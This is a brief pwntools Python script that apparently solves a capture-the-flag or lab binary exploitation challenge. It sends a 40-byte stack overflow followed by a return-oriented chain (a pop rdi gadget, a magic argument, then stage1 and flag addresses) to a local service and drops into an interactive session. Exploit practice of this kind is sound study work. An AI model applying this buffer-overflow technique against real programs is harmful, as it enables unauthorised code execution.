#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64', os='linux') # i386, amd64
_ATT = 0
_local = 0

host = "127.0.0.1"
port = "1337"
exe_path = './lab1'
#libc_path = './LIBC'
r = None
elf = None
libc_elf = None
def conn():
	global r, elf, libc_elf
	elf = ELF(exe_path)
	#libc_elf = ELF(libc_path)
	if _local:
		r = process(exe_path)
	else:
		r = remote(host, port)
conn()
if _ATT:
	log.info('Waiting for attach...')
	raw_input()

stage1 = 0x4006ca
flag = 0x4006ef

pop_rdi = 0x4007e3

payload='A'*40
payload += p64(pop_rdi) + p64(0xDEADBEEFCAFEBABE)
payload += p64(stage1)
payload += p64(flag)

print r.recvuntil(':')
r.sendline(payload)
# print r.recv()
r.interactive()
